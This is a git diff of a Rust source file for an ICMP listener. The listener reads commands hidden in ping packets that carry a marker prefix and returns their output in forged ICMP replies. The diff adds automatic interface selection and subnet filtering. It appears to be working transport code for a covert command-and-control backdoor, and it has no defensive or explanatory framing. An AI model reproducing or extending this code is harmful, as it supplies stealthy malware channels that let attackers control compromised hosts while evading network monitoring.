@@ -1,25 +1,20 @@
-use pnet::datalink::Channel::Ethernet;
-use pnet::datalink::DataLinkReceiver;
-use pnet::datalink::DataLinkSender;
-use pnet::datalink::{self, NetworkInterface};
-use pnet::packet::ethernet::EtherType;
-use pnet::packet::ethernet::EthernetPacket;
-use pnet::packet::ethernet::MutableEthernetPacket;
-use pnet::packet::icmp::IcmpPacket;
-use pnet::packet::icmp::IcmpType;
-use pnet::packet::icmp::MutableIcmpPacket;
-use pnet::packet::ip::IpNextHeaderProtocol;
-use pnet::packet::ipv4::MutableIpv4Packet;
-use pnet::packet::ipv4::{checksum, Ipv4Packet};
-use pnet::packet::Packet;
-use pnet::util::MacAddr;
-use std::io::{Read, Write};
-use std::net::Ipv4Addr;
-// Invoke as echo <interface name>
+use pnet::{
+    datalink::{self, Channel::Ethernet, DataLinkReceiver, DataLinkSender, NetworkInterface},
+    packet::{
+        ethernet::{EtherType, EthernetPacket, MutableEthernetPacket},
+        icmp::{IcmpPacket, IcmpType, MutableIcmpPacket},
+        ip::IpNextHeaderProtocol,
+        ipv4::{checksum, Ipv4Packet, MutableIpv4Packet},
+        Packet,
+    },
+    util::MacAddr,
+};
+use std::{
+    io::{Read, Write},
+    net::Ipv4Addr,
+};
 
-static cmd_init: &[u8; 5] = b"HELLO";
-static cmd_resp: &[u8; 18] = b"\0\0\0\0\0\0\0\0\0\0\0\0\0GOODBYE";
-static cmd_resp_end: &[u8; 5] = b"DONE";
+use crate::vars::{CMD_END, CMD_INIT, CMD_RESP};
 
 pub struct IcmpListener {
     tx: Box<dyn DataLinkSender>,
@@ -31,10 +26,21 @@ pub struct IcmpListener {
 }
 
 impl IcmpListener {
-    pub fn new(interface_name: String) -> IcmpListener {
-        let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;
-
+    pub fn new() -> IcmpListener {
         // Find the network interface with the provided name
+        let prevent_loopback = |iface: &NetworkInterface| {
+            for ipnet in &iface.ips {
+                if ipnet.ip().is_loopback() {
+                    return false;
+                }
+            }
+            return true;
+        };
+        let interfaces = datalink::interfaces();
+        let interface_vec: Vec<NetworkInterface> =
+            interfaces.into_iter().filter(prevent_loopback).collect();
+        let interface_name = get_interface(interface_vec);
+        let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;
         let interfaces = datalink::interfaces();
         let interface = interfaces
             .into_iter()
@@ -61,16 +67,37 @@ impl IcmpListener {
         }
     }
 }
+
 impl Read for IcmpListener {
     fn read(&mut self, buffer: &mut [u8]) -> Result<usize, std::io::Error> {
         loop {
             let packet = &self.rx.next()?;
-            let eth_packet = EthernetPacket::new(packet).unwrap();
+            let eth_packet = match EthernetPacket::new(packet) {
+                Some(x) => x,
+                None => continue,
+            };
 
-            let ip_packet = Ipv4Packet::new(eth_packet.payload()).unwrap();
+            let ip_packet = match Ipv4Packet::new(eth_packet.payload()) {
+                Some(x) => x,
+                None => continue,
+            };
 
             if ip_packet.get_next_level_protocol().0 == 1 {
-                let packet = IcmpPacket::new(ip_packet.payload()).unwrap();
+                let source = format!("{}", ip_packet.get_destination());
+                if cfg!(target_os = "freebsd") {
+                    if &source[0..=2] != "192" {
+                        continue;
+                    }
+                } else {
+                    if &source[0..=1] != "10" {
+                        continue;
+                    }
+                }
+
+                let packet = match IcmpPacket::new(ip_packet.payload()) {
+                    Some(x) => x,
+                    None => continue,
+                };
                 let mut payload = packet.payload().to_vec();
                 loop {
                     let byte = payload.get(0).unwrap();
@@ -81,17 +108,19 @@ impl Read for IcmpListener {
                     }
                 }
                 if packet.get_icmp_type().0 == 8 {
-                    if &payload[0..5] == cmd_init {
-                        self.mac_src = eth_packet.get_source();
-                        self.mac_dst = eth_packet.get_destination();
-                        self.ip_src = ip_packet.get_source();
-                        self.ip_dst = ip_packet.get_destination();
-                        let cmd = &payload[5..];
-                        let len = cmd.len();
-                        for i in 0..len {
-                            buffer[i] = cmd[i];
+                    if payload.len() >= 5 {
+                        if &payload[0..5] == CMD_INIT {
+                            self.mac_src = eth_packet.get_source();
+                            self.mac_dst = eth_packet.get_destination();
+                            self.ip_src = ip_packet.get_source();
+                            self.ip_dst = ip_packet.get_destination();
+                            let cmd = &payload[5..];
+                            let len = cmd.len();
+                            for i in 0..len {
+                                buffer[i] = cmd[i];
+                            }
+                            return Ok(len);
                         }
-                        return Ok(len);
                     }
                 }
             }
@@ -104,11 +133,11 @@ impl Write for IcmpListener {
         let chunks: Vec<&[u8]> = out.chunks(975).collect();
         // 20 Long
         for (i, chunk) in chunks.iter().enumerate() {
-            let mut balls: Vec<u8> = Vec::from(*cmd_resp);
+            let mut balls: Vec<u8> = Vec::from(*CMD_RESP);
             let mut c: Vec<u8> = Vec::from(*chunk);
             balls.append(&mut c);
             if i == chunks.len() - 1 {
-                balls.append(&mut Vec::from(*cmd_resp_end));
+                balls.append(&mut Vec::from(*CMD_END));
             }
             let mut buffer = [0; 1000];
             let mut new_icmp_packet = MutableIcmpPacket::new(&mut buffer).unwrap();
@@ -131,8 +160,6 @@ impl Write for IcmpListener {
             new_ip_packet.set_checksum(checksum(&new_ip_packet.to_immutable()));
             let mut buffer = [0; 1080];
             let mut new_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
-
-            // Switch the source and destination
             new_packet.set_source(self.mac_dst);
             new_packet.set_destination(self.mac_src);
             new_packet.set_ethertype(EtherType::new(0x0800));
@@ -145,5 +172,33 @@ impl Write for IcmpListener {
 
     fn flush(&mut self) -> Result<(), std::io::Error> {
         todo!()
+    }
+}
+
+fn get_interface(interface_vec: Vec<NetworkInterface>) -> String {
+    match interface_vec.len() {
+        0 => "Chom".to_string(),
+        1 => format!("{}", interface_vec.get(0).unwrap().name),
+        x => {
+            if x > 1 {
+                for iface in &interface_vec {
+                    for ipnetwork in &iface.ips {
+                        let ip_addr = format!("{}", ipnetwork.ip());
+                        if ip_addr.len() >= 3 {
+                            if cfg!(target_os = "freebsd") {
+                                if &ip_addr[0..=2] == "192" {
+                                    return format!("{}", iface.name);
+                                }
+                            } else {
+                                if &ip_addr[0..=2] == "10." {
+                                    return format!("{}", iface.name);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            return format!("{}", interface_vec.get(0).unwrap().name);
+        }
     }
 }
